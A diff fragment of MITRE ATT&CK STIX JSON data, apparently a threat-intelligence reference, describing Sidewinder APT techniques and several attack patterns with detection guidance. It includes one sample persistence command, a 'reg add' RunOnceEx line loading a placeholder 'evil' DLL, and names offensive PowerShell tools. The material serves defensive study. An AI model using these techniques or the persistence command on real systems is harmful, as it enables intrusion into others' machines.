+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--afbd6b8a-8636-401c-b04d-e0aa584fa6fa",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used VBScript to drop and execute malware loaders.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
+            "modified": "2021-04-21T12:32:47.118Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:35:33.496Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--b30cc0be-74f0-42a6-85ef-594d6d184bae",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
+            "modified": "2021-04-06T22:07:34.266Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:35:54.458Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--b5766b7d-0a7d-4bbc-8a44-211825de80db",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to automatically collect system and network configuration information.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
+            "modified": "2021-04-06T22:07:34.269Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T18:45:49.800Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--cbfb1a32-4582-4ecb-8a0e-4c76caaa5063",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has sent e-mails with malicious attachments often crafted for specific targets.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
+            "modified": "2021-04-06T22:07:34.012Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:43:48.406Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--ccb80607-a8bf-4e6b-a3e3-1755cd317552",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has named malicious files <code>rekeywiz.exe</code> to match the name of a legitimate Windows executable.(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
+            "modified": "2021-04-08T17:35:15.896Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-04-08T15:24:43.698Z",
+            "external_references": [
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--d2ea2645-1940-4776-a874-09309f75636a",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has lured targets to click on malicious links to gain execution in the target environment.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
+            "modified": "2021-07-21T12:24:09.318Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-04-07T15:19:28.661Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--eab4c1aa-d84d-4111-ab87-710345bdd31d",
+            "description": "(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4",
+            "modified": "2021-04-06T22:07:34.068Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:39:52.200Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--f1ef0014-9d3d-407a-aa86-8aab6c92edda",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has lured targets to click on malicious files to gain execution in the target environment.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+            "modified": "2021-08-30T23:07:30.377Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-29T19:04:19.989Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--ff49e4df-4693-4df5-adf8-15e765963155",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
+            "modified": "2021-04-06T22:07:34.193Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:39:52.147Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-26T20:15:35.821Z",
+            "name": "Web Protocols",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Traffic Content"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-03-15T16:13:46.151Z",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+            "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1071/001",
+                    "external_id": "T1071.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Automated Collection",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1119",
+                    "external_id": "T1119",
+                    "source_name": "mitre-attack"
+                }
+            ],
+            "x_mitre_data_sources": [
+                "File: File Access",
+                "Command: Command Execution",
+                "Script: Script Execution"
+            ],
+            "x_mitre_version": "1.0",
+            "modified": "2020-03-31T22:18:43.019Z",
+            "x_mitre_system_requirements": [
+                "Permissions to access directories and files that store information of interest."
+            ],
+            "id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "collection"
+                }
+            ],
+            "x_mitre_detection": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created": "2017-05-31T21:31:27.985Z",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Automated Exfiltration",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1020",
+                    "external_id": "T1020",
+                    "source_name": "mitre-attack"
+                }
+            ],
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Script: Script Execution",
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Traffic Content",
+                "File: File Access"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-08-16T15:23:38.940Z",
+            "created": "2017-05-31T21:30:29.458Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "exfiltration"
+                }
+            ],
+            "x_mitre_network_requirements": true,
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
+            "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
+            "x_mitre_contributors": [
+                "ExtraHop"
+            ],
+            "x_mitre_detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Network"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-01-06T18:36:29.226Z",
+            "name": "Registry Run Keys / Startup Folder",
+            "x_mitre_data_sources": [
+                "Windows Registry: Windows Registry Key Creation",
+                "Windows Registry: Windows Registry Key Modification",
+                "File: File Modification",
+                "Command: Command Execution",
+                "Process: Process Creation"
+            ],
+            "x_mitre_version": "1.1",
+            "created": "2020-01-23T22:02:48.566Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "persistence"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "privilege-escalation"
+                }
+            ],
+            "x_mitre_permissions_required": [
+                "Administrator",
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
+            "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Oddvar Moe, @oddvarmoe"
+            ],
+            "x_mitre_detection": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1547/001",
+                    "external_id": "T1547.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/270.html",
+                    "external_id": "CAPEC-270",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "Microsoft Run Key",
+                    "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
+                    "url": "http://msdn.microsoft.com/en-us/library/aa376977"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
+                    "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
+                    "source_name": "Microsoft Wow6432Node 2018"
+                },
+                {
+                    "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
+                    "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
+                    "source_name": "Malwarebytes Wow6432Node 2016"
+                },
+                {
+                    "source_name": "Microsoft RunOnceEx APR 2018",
+                    "description": "Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",
+                    "url": "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key"
+                },
+                {
+                    "source_name": "Oddvar Moe RunOnceEx Mar 2018",
+                    "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
+                    "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/"
+                },
+                {
+                    "source_name": "TechNet Autoruns",
+                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-05-28T14:56:23.748Z",
+            "name": "PowerShell",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Module: Module Load",
+                "Process: Process Creation",
+                "Script: Script Execution"
+            ],
+            "x_mitre_version": "1.1",
+            "created": "2020-03-09T13:48:55.078Z",
+            "x_mitre_contributors": [
+                "Praetorian"
+            ],
+            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator"
+            ],
+            "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_remote_support": true,
+            "x_mitre_detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1059/001",
+                    "external_id": "T1059.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "TechNet PowerShell",
+                    "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx"
+                },
+                {
+                    "source_name": "Github PSAttack",
+                    "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
+                    "url": "https://github.com/jaredhaight/PSAttack"
+                },
+                {
+                    "url": "http://www.sixdub.net/?p=367",
+                    "description": "Warner, J.. (2015, January 6). Inexorable PowerShell \u2013 A Red Teamer\u2019s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
+                    "source_name": "Sixdub PowerPick Jan 2016"
+                },
+                {
+                    "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
